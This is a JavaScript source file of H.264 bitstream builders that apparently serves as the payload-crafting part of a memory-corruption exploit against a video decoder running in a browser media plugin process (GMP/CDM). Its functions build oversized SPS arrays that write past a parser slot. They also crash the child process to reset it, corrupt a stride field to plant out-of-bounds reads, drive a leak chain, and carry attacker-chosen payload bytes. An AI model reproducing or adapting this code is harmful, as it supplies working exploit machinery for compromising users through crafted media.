// H.264 NAL builders

import { BW, escapeEmulation, concat } from './bitwriter.js';

export { concat };

export const SC = new Uint8Array([0, 0, 0, 1]);

function finishNal(nalHdr, rbsp) {
  return concat(new Uint8Array([nalHdr]), escapeEmulation(rbsp));
}

// Baseline SPS used to allocate a distinct SPS slab node by sps_id.
export function buildGroomSps(spsId, numCycle = 0) {
  const w = new BW();
  w.u(66, 8); w.u(0xc0, 8); w.u(30, 8);
  w.ue(spsId);
  w.ue(0);
  w.ue(1);          // pic_order_cnt_type = 1
  w.u(1, 1);
  w.se(0); w.se(0);
  w.ue(numCycle);
  for (let i = 0; i < numCycle; i++) w.se(0);
  w.ue(1);
  w.u(0, 1);
  w.ue(0); w.ue(0);
  w.u(1, 1); w.u(1, 1);
  w.u(0, 1); w.u(0, 1);
  w.u(1, 1);
  return finishNal(0x67, w.bytes());
}

// Overflow SPS: a long offset_for_ref_frame[] array whose se(v) deltas write
// past the slot. sps_id selects which existing slot the parser re-parses into.
export function buildOverflowSps(count, offsets, spsId = 0) {
  const w = new BW();
  w.u(66, 8); w.u(0xc0, 8); w.u(30, 8);
  w.ue(spsId);
  w.ue(0); w.ue(1); w.u(1, 1);
  w.se(0); w.se(0);
  w.ue(count);
  for (const d of offsets) w.se(d);
  w.ue(1); w.u(0, 1); w.ue(0); w.ue(0);
  w.u(1, 1); w.u(1, 1); w.u(0, 1); w.u(0, 1); w.u(1, 1);
  return finishNal(0x67, w.bytes());
}

// Kill SPS: a huge offset array that overflows into a guard page, crashing
// the GMP child so the next attempt starts from a fresh decoder.
export function buildKillSps(spsId = 0x99, count = 10000) {
  const offsets = new Array(count).fill(0);
  return buildOverflowSps(count, offsets, spsId);
}

// High-profile SPS with scaling-matrix + overflow deltas. Used by AU2/AU4.
export function buildHighSpsWithId(spsId, count, offs) {
  const w = new BW();
  w.u(100, 8); w.u(0, 8); w.u(30, 8);
  w.ue(spsId);
  w.ue(1); w.ue(0); w.ue(0);
  w.u(0, 1); w.u(1, 1);
  for (let i = 0; i < 8; i++) {
    w.u(1, 1);
    const size = i < 6 ? 16 : 64;
    const C = 0x11 * (i + 1);
    w.se(C - 8);
    for (let j = 1; j < size; j++) w.se(0);
  }
  w.ue(0);
  w.ue(1);
  w.u(1, 1); w.se(0); w.se(0);
  w.ue(count);
  for (const d of offs) w.se(d);
  w.ue(1); w.u(0, 1); w.ue(0); w.ue(0);
  w.u(1, 1); w.u(1, 1); w.u(0, 1); w.u(0, 1); w.u(1, 1);
  return finishNal(0x67, w.bytes());
}

// Minimal high-profile SPS used as the parse-into-X target (AU3, AU5).
export function buildPartialSps(spsId, deltas) {
  const w = new BW();
  w.u(100, 8); w.u(0, 8); w.u(30, 8);
  w.ue(spsId);
  w.ue(1); w.ue(0); w.ue(0);
  w.u(0, 1); w.u(0, 1);
  w.ue(0); w.ue(1); w.u(1, 1);
  w.se(0); w.se(0);
  w.ue(deltas.length);
  for (const d of deltas) w.se(d);
  w.ue(1); w.u(0, 1); w.ue(0); w.ue(0);
  w.u(1, 1); w.u(1, 1); w.u(0, 1); w.u(0, 1); w.u(1, 1);
  return finishNal(0x67, w.bytes());
}

// PPS referencing a specific sps_id, registered under ppsId. Re-parsing
// pps_id=0 doesn't relink its sps_id in the CDM, so the leak chain uses a
// fresh pps_id=1 for its drain slice.
export function buildPps(spsId, ppsId = 0) {
  const bits = [];
  const wue = (v) => {
    const c = v + 1;
    let n = 0, t = c;
    while (t > 0) { n++; t >>>= 1; }
    if (n === 0) n = 1;
    for (let i = 0; i < n - 1; i++) bits.push(0);
    for (let i = n - 1; i >= 0; i--) bits.push((c >> i) & 1);
  };
  wue(ppsId);
  wue(spsId);
  // Tail bits copied from a real PPS body (minus the two leading ue fields)
  // so the per-PPS scalars match what the CDM expects.
  const tail = [0,0,1,0,1,1,1,0,0,0,0,0,1,1,1,1,0,0,1,0,1,1,0,0,1];
  for (const b of tail) bits.push(b);
  while (bits.length % 8) bits.push(0);
  const body = new Uint8Array(bits.length / 8);
  for (let i = 0; i < bits.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | bits[i + j];
    body[i / 8] = b;
  }
  return concat(new Uint8Array([0x68]), body);
}

// P-skip slice: one all-skip P macroblock copied from the most-recent decoded
// picture. The copy reads its source stride from [live SPS+0x60], so a
// corrupted +0x60 plants OOB-read bytes into the new picbuf. ref_idc=0 keeps
// the slice non-reference, side-stepping the frame_num-monotonicity constraint.
export function buildPSkipSlice(ppsId = 0, mbSkipRun = 1) {
  const w = new BW();
  w.ue(0); w.ue(5); w.ue(ppsId); w.u(0, 4);
  w.u(0, 1); w.u(0, 1);
  w.se(0); w.ue(0); w.se(0); w.se(0);
  w.ue(mbSkipRun);
  w.u(1, 1);
  return finishNal(0x01, w.bytes());
}

// I_PCM IDR slice. Default luma is a 0..255 ramp, chroma 0x80. ppsId selects
// the registered PPS, whose sps_id chooses the SPS used for the blit geometry.
export function buildPcmSlice(ppsId = 0) {
  const w = new BW();
  w.ue(0); w.ue(7); w.ue(ppsId); w.u(0, 4); w.ue(0);
  w.u(0, 1); w.u(0, 1); w.se(0); w.ue(0); w.se(0); w.se(0);
  w.ue(25);
  while (w.bits.length % 8) w.bits.push(0);
  for (let i = 0; i < 256; i++) w.u(i & 0xff, 8);
  for (let i = 0; i < 128; i++) w.u(0x80, 8);
  w.u(1, 1);
  return finishNal(0x65, w.bytes());
}

// I_PCM IDR slice carrying attacker-chosen luma bytes (chroma all zero).
export function buildPcmWithPayload(lumaBytes) {
  if (lumaBytes.length !== 256) {
    throw new Error(`buildPcmWithPayload: luma must be 256 bytes, got ${lumaBytes.length}`);
  }
  const w = new BW();
  w.ue(0); w.ue(7); w.ue(0); w.u(0, 4); w.ue(0);
  w.u(0, 1); w.u(0, 1); w.se(0); w.ue(0); w.se(0); w.se(0);
  w.ue(25);
  while (w.bits.length % 8) w.bits.push(0);
  for (let i = 0; i < 256; i++) w.u(lumaBytes[i], 8);
  for (let i = 0; i < 128; i++) w.u(0, 8);
  w.u(1, 1);
  return finishNal(0x65, w.bytes());
}

// end_of_stream NAL (type 11). Non-VCL: sent alone it makes the CDM flush any
// buffered output frame via the copy_plane path WITHOUT running the slice
// decoder (whose chroma assembly would SIGSEGV on the wild LIVE+0x60 stride).
export function buildEndOfStream() {
  return new Uint8Array([0x0B]);
}

// Assemble NAL bodies (header + RBSP, no start code) into one AnnexB AU,
// each prefixed by a 4-byte start code.
export function assembleAu(nals) {
  const parts = [];
  for (const n of nals) {
    parts.push(SC);
    parts.push(n);
  }
  return concat(...parts);
}
